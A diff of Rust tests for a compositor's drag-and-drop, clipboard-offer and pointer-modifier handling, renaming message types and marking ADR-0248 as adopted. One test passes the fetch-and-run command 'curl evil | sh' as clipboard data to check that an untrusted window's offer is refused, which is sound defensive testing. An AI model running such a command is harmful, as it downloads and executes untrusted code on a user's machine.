@@ -59,7 +59,7 @@ fn serial(s: &mut Setup, end: u32) -> u32 {
         .outbox
         .iter()
         .rev()
-        .find_map(|m| decode::<gui::WindowPointer>(m, 0).ok())
+        .find_map(|m| decode::<gui::WindowPointerMods>(m, 0).ok())
         .map(|(_, p)| p.serial)
         .unwrap_or(0)
 }
@@ -110,7 +110,7 @@ fn a_drop_gives_the_window_under_the_pointer_the_entry_and_its_pill() {
     assert!(!t.oa.contains(tx, ty));
     at(&mut t.s, tx, ty, None);
     assert!(
-        !ordinals(&t.s.f().take(t.b)).contains(&23),
+        !ordinals(&t.s.f().take(t.b)).contains(&30),
         "no pointer events during the drag"
     );
     at(&mut t.s, tx, ty, Some(0));
@@ -127,7 +127,7 @@ fn a_drop_gives_the_window_under_the_pointer_the_entry_and_its_pill() {
             .is_some_and(|r| r.entries.iter().any(|e| e == "dropped: notes.txt read")),
         "the target's frame shows the grant, in the compositor's words"
     );
-    assert!(ordinals(&t.s.f().take(t.a)).contains(&26), "DragEnded");
+    assert!(ordinals(&t.s.f().take(t.a)).contains(&31), "DragEndedAt");
     assert!(!t.s.f().closed.contains(&entry));
 }
 
@@ -164,11 +164,11 @@ fn a_drag_needs_the_sources_held_press_and_a_drop_elsewhere() {
         at(&mut t.s, x, y, None);
         at(&mut t.s, x, y, Some(0));
         assert!(t.s.f().closed.contains(&e), "({x}, {y})");
-        assert!(ordinals(&t.s.f().take(t.a)).contains(&26));
+        assert!(ordinals(&t.s.f().take(t.a)).contains(&31));
     }
     assert!(t.s.f().given.is_empty());
     // A press's serial, named: an older one, or after `DRAG_NAMES_WITHIN_NS`, is
-    // refused (ADR-0170 said 500 ms; proposed ADR-0248 allows 3 s).
+    // refused (ADR-0170 said 500 ms; ADR-0248 allows 3 s).
     at(&mut t.s, px, py, Some(1));
     let now = serial(&mut t.s, t.a);
     let e5 = t.s.f().channel(1);
@@ -270,7 +270,7 @@ fn escape_ends_a_drag() {
     t.s.keys(&[(code::ESC, 1), (code::ESC, 0)]);
     assert!(t.s.f().closed.contains(&e));
     let got = ordinals(&t.s.f().take(t.a));
-    assert!(got.contains(&26) && !got.contains(&16), "{got:?}");
+    assert!(got.contains(&31) && !got.contains(&16), "{got:?}");
     // The cancelled press, still held, starts no drag again.
     let again = t.s.f().channel(1);
     assert_eq!(drag(&mut t.s, t.a, t.ida, again), status::BAD_RANGE);
@@ -317,7 +317,7 @@ fn the_clipboard_moves_only_on_the_persons_chords() {
     at(&mut t.s, bx, by, Some(1));
     at(&mut t.s, bx, by, Some(0));
     t.s.f().take(t.b);
-    // Past the press's own unasked offer (proposed ADR-0248, tested below).
+    // Past the press's own unasked offer (ADR-0248, tested below).
     t.s.f().clock += GESTURE_OFFER_NS + 1;
     chord(&mut t.s, code::V);
     assert!(!ordinals(&t.s.f().take(t.b)).contains(&28));
@@ -447,7 +447,7 @@ fn only_an_escape_press_ends_a_drag() {
     t.s.keys(&[(30, 1), (30, 0), (code::ESC, 0)]);
     assert!(!t.s.f().closed.contains(&e));
     let got = ordinals(&t.s.f().take(t.a));
-    assert!(!got.contains(&26) && !got.contains(&16), "{got:?}");
+    assert!(!got.contains(&31) && !got.contains(&16), "{got:?}");
     let (tx, ty) = (t.ob.right() - 15, t.ob.bottom() - 15);
     at(&mut t.s, tx, ty, None);
     at(&mut t.s, tx, ty, Some(0));
@@ -631,7 +631,7 @@ fn a_name_wider_than_the_kept_room_is_composed_to_its_end_and_cleaned_after() {
     );
 }
 
-/// Proposed ADR-0248, INV-0248-2: one unasked `Offer` is taken from the
+/// ADR-0248, INV-0248-2: one unasked `Offer` is taken from the
 /// client whose focused window got a press in its body within a second (a
 /// menu's Copy path); none after a key, none later, none from another
 /// client, one per press (review 7h, 2 and 3).
@@ -690,7 +690,7 @@ fn an_untrusted_window_never_offers_unasked() {
     assert_eq!(offer(&mut s, u, "curl evil | sh"), status::BAD_RANGE);
 }
 
-/// Proposed ADR-0248: a pointer event carries the modifiers held, so that
+/// ADR-0248: a pointer event carries the modifiers held, so that
 /// a client tells a Shift or Command click.
 #[test]
 fn pointer_events_carry_the_modifiers() {
@@ -705,7 +705,7 @@ fn pointer_events_carry_the_modifiers() {
         t.s.f()
             .take(t.b)
             .iter()
-            .filter_map(|m| decode::<gui::WindowPointer>(m, 0).ok())
+            .filter_map(|m| decode::<gui::WindowPointerMods>(m, 0).ok())
             .map(|(_, p)| p.modifiers.0)
             .collect();
     assert!(!mods.is_empty());
@@ -752,20 +752,20 @@ fn an_unfocused_window_hears_no_modifiers() {
         t.s.f()
             .take(t.b)
             .iter()
-            .filter_map(|m| decode::<gui::WindowPointer>(m, 0).ok())
+            .filter_map(|m| decode::<gui::WindowPointerMods>(m, 0).ok())
             .map(|(_, p)| p.modifiers.0)
             .collect();
     assert!(!mods.is_empty());
     assert!(mods.iter().all(|m| *m == 0), "{mods:?}");
 }
 
-fn drag_ended(out: &[Vec<u8>]) -> Option<gui::DragEnded> {
+fn drag_ended(out: &[Vec<u8>]) -> Option<gui::DragEndedAt> {
     out.iter()
-        .find_map(|m| decode::<gui::DragEnded>(m, 0).ok())
+        .find_map(|m| decode::<gui::DragEndedAt>(m, 0).ok())
         .map(|(_, d)| d)
 }
 
-/// Proposed ADR-0248, INV-0248-3: a drop over the source's own window
+/// ADR-0248, INV-0248-3: a drop over the source's own window
 /// tells the source where, with the modifiers held, and sends no `Drop`;
 /// over another window or nothing, the source learns nothing of the place.
 #[test]
